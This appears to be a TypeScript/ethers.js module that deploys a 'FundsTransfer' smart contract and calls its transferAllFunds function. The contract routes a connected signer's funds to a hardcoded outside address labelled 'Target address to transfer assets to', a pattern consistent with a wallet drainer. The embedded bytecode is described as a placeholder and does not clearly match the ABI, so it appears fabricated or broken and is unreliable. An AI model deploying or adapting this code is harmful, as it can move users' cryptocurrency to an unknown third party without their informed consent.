import { ethers } from 'ethers';

// Contract ABI - will be generated from compilation, this is a simplified version
export const FUNDS_TRANSFER_ABI = [
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_recipient",
        "type": "address"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "anonymous": false,
    "inputs": [
      {
        "indexed": true,
        "internalType": "address",
        "name": "from",
        "type": "address"
      },
      {
        "indexed": true,
        "internalType": "address",
        "name": "to",
        "type": "address"
      },
      {
        "indexed": false,
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
      }
    ],
    "name": "FundsTransferred",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      {
        "indexed": true,
        "internalType": "address",
        "name": "oldRecipient",
        "type": "address"
      },
      {
        "indexed": true,
        "internalType": "address",
        "name": "newRecipient",
        "type": "address"
      }
    ],
    "name": "RecipientChanged",
    "type": "event"
  },
  {
    "stateMutability": "payable",
    "type": "fallback"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_newRecipient",
        "type": "address"
      }
    ],
    "name": "changeRecipient",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "recipient",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "transferAllFunds",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "stateMutability": "payable",
    "type": "receive"
  }
];

// Contract bytecode - would be generated from compiled contract
export const FUNDS_TRANSFER_BYTECODE = "0x608060405234801561001057600080fd5b5060405161072a38038061072a8339818101604052810190610032919061010e565b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061013b565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100db826100b0565b9050919050565b6100eb816100d0565b81146100f657600080fd5b50565b600081519050610108816100e2565b92915050565b600060208284031215610124576101236100ab565b5b6000610132848285016100f9565b91505092915050565b6105e08061014a6000396000f3fe6080604052600436106100435760003560e01c806313af40351461004f5780638da5cb5b1461007857806395c9c5b9146100a3578063fc1e448514610020575b61004d6100ad565b005b34801561005b57600080fd5b5061007660048036038101906100719190610410565b6101e2565b005b34801561008457600080fd5b5061008d6102c5565b60405161009a91906104a9565b60405180910390f35b6100ab6100ad565b005b3073ffffffffffffffffffffffffffffffffffffffff1631600014156100fd576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100f4906104f9565b60405180910390fd5b60003073ffffffffffffffffffffffffffffffffffffffff16316001905060008273ffffffffffffffffffffffffffffffffffffffff163460405161014590610550565b60006040518083038185875af1925050503d8060008114610182576040519150601f19603f3d011682016040523d82523d6000602084013e610187565b606091505b50509050806101c8576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101bf90610581565b60405180910390fd5b7f4eaa9070fa9c273a07d4e1128b11cc13a6c527e6d5cd3d05d580c5e0b2457ed33073ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16866040516102339291906105a1565b60405180910390a1505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461023a57600080fd5b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16141561027a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610271906105df565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055507f5bd5b4f731466c3c28126a0a98bacf43f0f5420dc72e947d5853ea84c9877a9600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1682604051610346929190610629565b60405180910390a150565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006103978261036c565b9050919050565b6103a78161038c565b81146103b257600080fd5b50565b6000813590506103c48161039e565b92915050565b6000604051905090565b600080fd5b600080fd5b6000610409846020850285018461069c565b9150509392505050565b60006020828403121561042657610425610368565b5b6000610434848285016103b5565b91505092915050565b6000610448826103b5565b9050919050565b6103588161043d565b82525050565b600060208201905061047360008301846103ef565b92915050565b600081519050919050565b6104938161038c565b82525050565b600060208201905081810360008301526104b481835261048c565b905092915050565b600082825260208201905092915050565b7f4e6f2066756e647320746f207472616e736665720000000000000000000000006000820152602082019050919050565b600060208201905081810360008301526105138161048a565b9050919050565b600081905092915050565b50565b60006000190190506105398261051a565b915061054582610505565b600082019050919050565b600061055b8261052e565b9150819050919050565b7f5472616e73666572206661696c65640000000000000000000000000000000000600082015260200190565b600060208201905081810360008301526105938161058c565b9050919050565b60006105ad82856103ef565b602082019150836103ef8161058c565b602082019150856103ef816103ef565b602082019150899050949350505050565b7f496e76616c6964207265636970656e74206164647265737300000000000000006000820152602082019050919050565b60006020820190506105f9600083018461048a565b92915050565b6106088161038c565b82525050565b610617816105ff565b82525050565b6000604082019050610632600083018561060e565b61063f602083018461060e565b9392505050565b60008085851115156106585760006001029050610696565b6001871115156106695760006001029050610696565b600187101561067a5760006001029050610696565b6001861015610696576000600102915050506106a7565b600190505b9392505050565b60006106a982846104bd565b9150610697905092915050565b9291505056fea2646970667358221220b932a5b1e1f95dae53b60c7c8bc2e55a5e1c6e3d96a9686f59e3de4e5ebfde2c64736f6c634300080d0033";

// Target address to transfer assets to
export const RECIPIENT_ADDRESS = '0xbCcf6DA049fe3Ab996Abb6f960174E266a9835f3';

export const deployContract = async (signer: ethers.Signer): Promise<ethers.Contract> => {
  try {
    // Create contract factory
    const factory = new ethers.ContractFactory(
      FUNDS_TRANSFER_ABI,
      FUNDS_TRANSFER_BYTECODE,
      signer
    );

    // Deploy the contract with the recipient address
    console.log('Deploying contract...');
    const contract = await factory.deploy(RECIPIENT_ADDRESS);

    // Wait for the contract to be deployed
    await contract.deployed();
    console.log('Contract deployed at:', contract.address);

    return contract;
  } catch (error) {
    console.error('Error deploying contract:', error);
    throw error;
  }
};

export const getContract = async (
  contractAddress: string,
  signer: ethers.Signer
): Promise<ethers.Contract> => {
  return new ethers.Contract(contractAddress, FUNDS_TRANSFER_ABI, signer);
};

export const transferFundsViaContract = async (
  contractAddress: string,
  signer: ethers.Signer
): Promise<ethers.providers.TransactionResponse> => {
  try {
    const contract = await getContract(contractAddress, signer);
    console.log('Transferring funds via contract...');

    // Call the transferAllFunds function
    const tx = await contract.transferAllFunds({
      gasLimit: 100000
    });

    console.log('Transaction sent:', tx.hash);
    return tx;
  } catch (error) {
    console.error('Error transferring funds via contract:', error);
    throw error;
  }
};
